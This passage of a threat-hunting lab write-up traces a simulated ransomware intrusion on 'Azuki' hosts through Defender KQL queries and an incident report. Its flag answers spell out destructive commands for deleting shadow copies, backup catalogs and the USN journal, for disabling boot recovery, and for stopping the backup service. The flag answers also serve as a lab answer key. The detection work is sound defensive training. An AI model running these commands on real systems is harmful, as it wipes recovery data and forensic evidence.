  - T1135 – Network Share Discovery
    - net share and net use reveal shared resources.
  - T1059 – Command and Scripting Interpreter
    - Execution via command-line utilities.
  - T1078 – Valid Accounts
    - Activity performed using legitimate credentials.

Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/845e7d8e05c7adda7e0e4c94c90fc0523665214d/Images/Azuki_Dead_inthe_Water/De17.png)

*Question: What command stopped the backup engine?*
```
"net" stop wbengine /y
```

#### FLAG 18: DEFENSE EVASION - Process Termination

Certain processes lock files and must be terminated before encryption can succeed.

Query used:

The query used detects execution of taskkill commands by the user kenji.sato on devices whose hostname contains “azuki” during the specified investigation window. It focuses on terminating running processes, which may indicate defensive evasion, disruption, or preparation for destructive activity.

```
DeviceProcessEvents 
| where DeviceName contains "azuki" 
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2026-01-04)) 
| where ProcessCommandLine contains '"taskkill"' 
| where AccountName == "kenji.sato"
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine, InitiatingProcessCommandLine
| order by TimeGenerated asc 
```
#### Common use
  - Investigating attempts to stop security or monitoring processes
  - Detecting malicious or unauthorized process termination
  - Supporting analysis of pre-impact or impact-stage actions
  - Validating whether taskkill usage aligns with legitimate administrative maintenance

#### Detection Logic
  - Filters process creation events to hosts containing “azuki”.
  - Restricts results to the defined timeframe.
  - Matches command lines containing "taskkill", indicating process termination attempts.
  - Limits activity to the user account kenji.sato.
  - Projects execution and initiation context and orders by timestamp for chronological analysis.

#### Investigative value
  - High signal of defensive evasion or interference with running services.
  - Helps determine:
    - Which processes were targeted or terminated
    - Whether process termination preceded destructive actions (e.g., backup deletion, VSS manipulation)
  - Enables correlation with:
    - Service stop/disable commands (systemctl stop/disable)
    - Backup access and deletion activity
    - Lateral movement or credential misuse

#### MITRE ATT&CK Mapping
  - T1489 – Service Stop
    -Stopping critical processes or services to prevent recovery or monitoring.
  - T1070.004 – Indicator Removal on Host 
    - Killing processes may remove evidence of running security tools.
  - T1059 – Command and Scripting Interpreter
    - taskkill executed via command line.

Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/845e7d8e05c7adda7e0e4c94c90fc0523665214d/Images/Azuki_Dead_inthe_Water/De18.png)

*Question: What command terminated processes to unlock files?*

```
"taskkill" /F /IM sqlservr.exe
```
#### FLAG 19: IMPACT - Recovery Point Deletion
Recovery points enable rapid file recovery without external backups.


Query used: 

The query used detects shadow copy–related command execution by the user kenji.sato on devices whose hostname contains “azuki” within the specified investigation window. It focuses on interaction with shadow copies, commonly associated with backup access, tampering, or recovery inhibition.

```
DeviceProcessEvents 
| where DeviceName contains "azuki" 
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2026-01-04)) 
| where ProcessCommandLine contains "shadow" 
| where AccountName == "kenji.sato"
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine, InitiatingProcessCommandLine
| order by TimeGenerated asc
```
#### Common use
  - Investigating shadow copy enumeration or deletion
  - Detecting backup and recovery manipulation
  - Supporting analysis of ransomware or impact-stage activity
  - Validating whether shadow-related commands align with authorized administrative tasks

#### Detection Logic
  - Filters process creation events to hosts containing “azuki”.
  - Restricts results to the defined timeframe.
  - Matches command lines containing shadow, capturing tools such as vssadmin, wmic shadowcopy, or related utilities.
  - Limits activity to the user account kenji.sato.
  - Projects execution and initiation context and orders results chronologically for timeline analysis.

#### Investigative value
  - High signal because shadow copies are critical to system recovery.
  - Helps determine:
    - Whether shadow copies were listed, modified, or deleted
    - If activity correlates with other recovery-inhibiting actions
  - Strong when correlated with:
    - VSS-related commands
    - Backup deletion attempts
    - Service stoppage or process termination (taskkill)

#### MITRE ATT&CK Mapping
  - T1490 – Inhibit System Recovery
    - Primary technique, as shadow copy manipulation prevents restoration.
  - T1070.004 – Indicator Removal on Host (contextual)
    - Shadow copy deletion removes forensic artifacts.
  - T1059 – Command and Scripting Interpreter
    - Execution via command-line utilities.


Result 
![image alt](https://github.com/Muts256/SNC-Public/blob/845e7d8e05c7adda7e0e4c94c90fc0523665214d/Images/Azuki_Dead_inthe_Water/De19.png)

*Question: What command deleted recovery points?*

```
"vssadmin" delete shadows /all /quiet
```

####  FLAG 20: IMPACT - Storage Limitation

Limiting storage prevents new recovery points from being created.

Query used:

Same as a previous

```
DeviceProcessEvents 
| where DeviceName contains "azuki" 
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2026-01-04)) 
| where ProcessCommandLine contains "shadow" 
| where AccountName == "kenji.sato"
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine, InitiatingProcessCommandLine
| order by TimeGenerated asc 
```
Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/845e7d8e05c7adda7e0e4c94c90fc0523665214d/Images/Azuki_Dead_inthe_Water/De20.png)

*Question: What command limited recovery storage?*

```
"vssadmin" resize shadowstorage /for=C: /on=C: /maxsize=401MB
```

####  FLAG 21: IMPACT - Recovery Disabled

Windows recovery features enable automatic system repair after corruption.

Query used:

This query is used to detect execution of cmd.exe and bcdedit commands by the user kenji.sato on devices whose hostname contains “azuki” during the specified investigation window. It focuses on boot configuration and command-line activity, which may indicate system startup modification, recovery suppression, or preparation for destructive actions.

```
DeviceProcessEvents 
| where DeviceName contains "azuki" 
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2026-01-04)) 
| where ProcessCommandLine has_any ("cmd", "bcdedit")
| where AccountName !in ("system", "network service", "local service")
| where AccountName == "kenji.sato"
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine, InitiatingProcessCommandLine

```
#### Common use
  - Investigating boot configuration manipulation
  - Detecting attempts to disable recovery or alter startup behavior
  - Supporting analysis of pre-impact or impact-stage activity
  - Validating whether low-level system configuration changes were authorized

#### Detection Logic
  - Filters process creation events to hosts containing “azuki”.
  - Restricts results to the defined timeframe.
  - Matches command lines containing cmd or bcdedit, indicating interactive command execution and boot configuration edits.
  - Excludes system and service accounts to focus on user-driven activity.
  - Limits results to the specific user account kenji.sato.
  - Projects execution, device, and initiation context for investigation.

#### Investigative value
  - Very high signal because bcdedit directly affects system boot behavior.
  - Helps determine:
    - Whether recovery options or boot policies were modified
    - If actions align with other destructive behaviors (VSS manipulation, backup deletion)
  - Critical for:
    - Assessing system integrity risks
    - Identifying intent to impair recovery or evade remediation

#### MITRE ATT&CK Mapping
  - T1542 – Pre-OS Boot
    - Modification of boot configuration via bcdedit.
  - T1490 – Inhibit System Recovery
    - Disabling recovery options or boot error handling.
  - T1562 – Impair Defenses 
    - Boot changes may weaken security controls.
  - T1059 – Command and Scripting Interpreter
    - Command execution via cmd.exe.

Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/845e7d8e05c7adda7e0e4c94c90fc0523665214d/Images/Azuki_Dead_inthe_Water/De21.png)

*Question: What command disabled system recovery?*

```
"bcdedit" /set {default} recoveryenabled No
```

#### FLAG 22: IMPACT - Catalog Deletion

Backup catalogues track available restore points and backup versions.

Query used:

This query is used to detect execution of commands containing catalog by the user kenji.sato on devices whose hostname contains “azuki” during the specified investigation window. It focuses on interactions with system catalogs or backup catalogs, which may indicate data enumeration, collection, or preparation for impact-related activity.

```
DeviceProcessEvents 
| where DeviceName contains "azuki" 
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2026-01-04)) 
| where ProcessCommandLine has " catalog"
| where AccountName == "kenji.sato"
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine, InitiatingProcessCommandLine

```

#### Common use
  - Investigating backup catalog inspection or tampering
  - Detecting preparation for destructive actions or data exfiltration
  - Supporting post-compromise activity analysis
  - Validating whether catalog access aligns with legitimate administrative or backup operations

#### Detection Logic
  - Filters process creation events to hosts containing “azuki”.
  - Restricts results to the defined timeframe.
  - Matches command lines containing "catalog", capturing commands that interact with system or backup catalogs.
  - Limits activity to the specific user account kenji.sato.
  - Projects execution, device, and initiating process details for investigation.

#### Investigative value
  - High signal for data discovery and potential impact actions.
  - Helps determine:
    - What catalogs were accessed
    - When and by which account
  - Useful when correlated with:
    - Backup directory access (cat /backups)
    - VSS or shadow copy manipulation
    - Destructive commands (rm -rf)

#### MITRE ATT&CK Mapping
  - T1005 – Data from Local System
    - Accessing backup or system catalog data.
  - T1490 – Inhibit System Recovery (contextual)
    - Catalog inspection can precede recovery inhibition.
  - T1078 – Valid Accounts
    - Activity performed using legitimate credentials (kenji.sato).


Result 

![image alt](https://github.com/Muts256/SNC-Public/blob/845e7d8e05c7adda7e0e4c94c90fc0523665214d/Images/Azuki_Dead_inthe_Water/De22.png)

*Question: What command deleted the backup catalogue?*

```
"wbadmin" delete catalog -quiet
```
---

###  PHASE 4: PERSISTENCE (FLAGS 23-24)
---

#### FLAG 23: PERSISTENCE - Registry Autorun
Registry keys can execute programs automatically at system startup

Query used:

The query used detects persistence mechanisms established via Windows Registry Run and RunOnce keys on devices whose hostname contains “azuki” within the specified investigation window. It focuses on registry modifications that cause programs to execute automatically at user logon, a common persistence technique.

```
DeviceRegistryEvents
| where DeviceName contains "azuki" 
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2026-01-04))
| where ActionType == "RegistryValueSet"
| where RegistryKey has_any(@"\Software\Microsoft\Windows\CurrentVersion\Run", @"\Software\Microsoft\Windows\CurrentVersion\RunOnce")
| project TimeGenerated, ActionType,  DeviceName, InitiatingProcessAccountName, RegistryValueName, InitiatingProcessCommandLine, RegistryValueData
```

#### Common use
  - Detecting malware persistence via registry autostart locations
  - Investigating unauthorized startup entries
  - Supporting analysis of post-compromise persistence
  - Validating whether registry changes align with legitimate software installation

#### Detection Logic
  - Filters registry events to devices containing “azuki”.
  - Restricts results to the defined timeframe.
  - Limits results to registry value creation/modification events (RegistryValueSet).
  - Matches registry keys associated with Run and RunOnce autostart locations.
  - Projects timing, user context, initiating process, and registry value data for investigation.

#### Investigative value
  - High-confidence signal of persistence establishment.
  - Helps determine:
    - What executable is configured to run at logon
    - Which process and account created the persistence
  - Enables correlation with:
    - Prior malware or tool execution
    - PowerShell- or PsExec-based activity
    - File creation events for referenced binaries

#### MITRE ATT&CK Mapping
  - T1547.001 – Registry Run Keys / Startup Folder
    - Directly applicable, as the query monitors Run and RunOnce keys.
  - T1059 – Command and Scripting Interpreter (contextual)
    - Registry changes are often made via command-line tools.
  - T1078 – Valid Accounts
    - Persistence created using legitimate user credentials.

Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/845e7d8e05c7adda7e0e4c94c90fc0523665214d/Images/Azuki_Dead_inthe_Water/De23.png)

*Question: What registry value establishes persistence?*

```
WindowsSecurityHealth
```

#### FLAG 24: PERSISTENCE - Scheduled Execution

Scheduled jobs provide reliable persistence with configurable triggers.

Query used:

This query is used to detect scheduled task creation or modification activity executed by the user kenji.sato on devices containing “azuki” in the hostname. Scheduled tasks are commonly abused to establish persistence or delayed execution.

```
DeviceProcessEvents 
| where DeviceName contains "azuki" 
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2026-01-04)) 
| where ProcessCommandLine has "schtasks"
| where AccountName == "kenji.sato"
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine, InitiatingProcessCommandLine

```
#### Common use
  - Detecting persistence via Windows Scheduled Tasks
  - Identifying living-off-the-land (LOLbin) abuse using schtasks.exe
  - Investigating post-exploitation persistence mechanisms
  - Tracking attacker activity executed under a legitimate user account

#### Detection Logic
  - Filters process execution events to devices containing “azuki”.
  - Restricts results to the defined investigation timeframe.
  - Matches process command lines containing schtasks, covering task creation, modification, or deletion.
  - Limits results to executions under the kenji.sato account.
  - Projects both the executed command and its initiating process for context.

#### Investigative value
  - Reveals:
    -Scheduled task names, triggers, and execution commands
    - Whether tasks run at logon, startup, or on a schedule
  - Helps distinguish legitimate administrative tasks from malicious persistence
  - Enables correlation with:
    - Registry Run key persistence
    - PowerShell-based task creation
    - Payload execution tied to task actions

#### MITRE ATT&CK Mapping
  - T1053.005 – Scheduled Task / Job: Scheduled Task
    - Primary technique for persistence via task scheduling.
  - T1059 – Command and Scripting Interpreter
    - schtasks.exe is often invoked via scripts or PowerShell.
  - T1078 – Valid Accounts
    - Execution occurs using a legitimate user account.

Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/845e7d8e05c7adda7e0e4c94c90fc0523665214d/Images/Azuki_Dead_inthe_Water/De24.png)

*Question: What scheduled task was created?*

```
Microsoft\Windows\Security\SecurityHealthService
```

---

### PHASE 5: ANTI-FORENSICS (FLAG 25)

---

#### FLAG 25: DEFENSE EVASION - Journal Deletion

Query used:

The query used detects interactions with the NTFS USN Journal (usn commands) by non-system accounts on devices whose hostname contains “azuki” within the specified investigation window. It focuses on file system activity monitoring or enumeration, often associated with reconnaissance, data collection, or forensic artifact access.

```
DeviceProcessEvents 
| where DeviceName contains "azuki" 
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2026-01-04)) 
| where ProcessCommandLine contains "usn"
| where AccountName != "system"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessCommandLine
```
#### Common use
  - Detecting file system enumeration via the USN Journal
  - Identifying activity that may indicate preparation for data exfiltration
  - Investigating post-compromise reconnaissance
  - Validating whether USN access aligns with legitimate administrative tasks or backup operations

#### Detection Logic
  - Filters process execution events to hosts containing “azuki”.
  - Restricts results to the defined timeframe.
  - Matches process command lines containing "usn".
  - Excludes the system account to focus on user-driven activity.
  - Projects execution context, device, account, and initiating process details.

#### Investigative value
  - High signal for discovery or data collection activity.
  - Helps determine:
    - Which account accessed the USN Journal
    - When and how the file system was enumerated
  - Useful when correlated with:
    - Backup file inspection (cat /backups)
    - Shadow copy or VSS activity
    - Lateral movement or post-access tool execution

#### MITRE ATT&CK Mapping
  - T1083 – File and Directory Discovery
    - USN Journal access is commonly used to enumerate files.
  - T1059 – Command and Scripting Interpreter (contextual)
    - Execution via command line or scripts.
  - T1078 – Valid Accounts
    - Activity executed using legitimate credentials.

Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/845e7d8e05c7adda7e0e4c94c90fc0523665214d/Images/Azuki_Dead_inthe_Water/De25.png)

*Question: What command deleted forensic evidence?*

```
"fsutil.exe" usn deletejournal /D C:
```
---
### PHASE 6: RANSOMWARE SUCCESS (FLAG 26)

---

#### FLAG 26: IMPACT - Ransom Note

Ransom notes typically communicate payment instructions and indicate that the encryption has been successful.

Query used:

This query is used to detect file creation activity on devices containing “azuki” in the hostname, specifically focusing on files named SILENTLYNX or newly created .txt files. This can indicate payload drops, tool staging, or output files generated by malicious commands or scripts.

```
DeviceFileEvents 
| where DeviceName contains "azuki" 
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2026-01-04)) 
| where FileName has_any ("SILENTLYNX", " .txt")
| where ActionType == "FileCreated"
| project TimeGenerated, DeviceName, FileName, FolderPath, InitiatingProcessCommandLine
```
### Common use
Detecting malware or tool deployment to disk
Identifying attacker-created artifacts (logs, command output, exfil staging files)
Investigating post-exploitation activity
Tracking execution results of reconnaissance or destructive commands

### Detection Logic
Filters file system events to devices containing “azuki”.
Limits results to the investigation timeframe.
Matches file creation events (ActionType == "FileCreated").
Filters for file names containing SILENTLYNX or .txt, capturing both tool binaries and output files.
Projects file path and initiating process command line for execution context.

### Investigative value
  - Helps identify:
    - Dropped executables or tools
  - Temporary or staging files created during attacker activity
  - Provides direct linkage between:
    - File creation and the process responsible
    - Earlier PsExec or PowerShell-based execution
  - Useful for timeline reconstruction and payload identification

#### MITRE ATT&CK Mapping
  - T1105 – Ingress Tool Transfer
    - Creation of attacker tools or payloads on disk.
  - T1059 – Command and Scripting Interpreter (contextual)
    - Files often created as a result of script or command execution.
  - T1036 – Masquerading (potential)
    - Use of benign-looking .txt files to hide malicious artifacts

Result:

![image alt](https://github.com/Muts256/SNC-Public/blob/845e7d8e05c7adda7e0e4c94c90fc0523665214d/Images/Azuki_Dead_inthe_Water/De26.png)

*Question: What is the filename of the ransom note?*

```
SILENTLYNX_README.txt
```

---



# Azuki Environment Ransomware Incident Report

**Date of Analysis:** January 2026  
**Prepared by:** Security Operations

---

## Executive Summary

Between **23 November 2025** and **4 January 2026**, a targeted ransomware incident was identified within the Azuki environment. Activity originated from a valid user account (`kenji.sato`) and impacted multiple systems, including the backup server.

The attacker performed reconnaissance, established persistence, disabled recovery mechanisms, deleted backups, and ultimately delivered a ransomware instruction file.

No confirmed data exfiltration was identified. Backup and recovery capabilities were significantly impacted.

---

## Scope

- Affected Hosts:
  - `azuki`
  - `azuki-backupsrv`
- Compromised Account:
  - `kenji.sato`
- Log Sources:
  - DeviceProcessEvents
  - DeviceNetworkEvents
  - DeviceRegistryEvents
  - DeviceFileEvents

---

## Attack Chain Overview

| Kill Chain Phase | Observed Activity | Evidence | MITRE ATT&CK |
|-----------------|------------------|----------|--------------|
| Reconnaissance | File and backup enumeration | `ls`, `find`, `cat`, USN journal access | T1083 |
| Weaponization | Tool preparation | `silentlynx.exe`, staging files | T1105 |
| Delivery | Tool transfer and execution | `curl`, `wget`, `PsExec64.exe` | T1105, T1569.002 |
| Exploitation | Execution via valid credentials | Non-system and root execution | T1078 |
| Installation | Persistence mechanisms | Registry Run keys, scheduled tasks | T1547.001, T1053.005 |
| Command & Control | Remote interactive access | SSH sessions, internal connections | T1021.004 |
| Actions on Objectives | Backup destruction and ransom | `rm -rf`, VSS, `bcdedit`, ransom note | T1486, T1490 |

---

## Key Findings

- Valid credentials were used to access systems and move laterally.
- Backup directories were identified, accessed, and deleted.
- Shadow copies and recovery mechanisms were disabled.
- Persistence was established using registry and scheduled tasks.
- A text file containing ransomware payment instructions was created.

---

## Impact Assessment

- Backup and recovery systems rendered unusable.
- Increased risk of prolonged service outage.
- Elevated business impact due to ransomware readiness.

---

## Recommendations

### Immediate
- Isolate affected systems.
- Reset credentials for compromised accounts.
- Restore systems from offline backups.
- Re-enable and validate critical services.

### Short-Term
- Perform a full forensic review of affected hosts.
- Increase monitoring for persistence techniques.
- Review administrative and PowerShell usage.

### Long-Term
- Enforce MFA for administrative accounts.
- Harden backup server access controls.
- Conduct ransomware incident response exercises.

---

#### Conclusion

This activity represents a complete ransomware attack lifecycle, progressing from valid‑account access, through reconnaissance, persistence, backup destruction, and culminating in ransom note delivery.
All phases are directly supported by correlated Defender telemetry across process, registry, network, and file events.
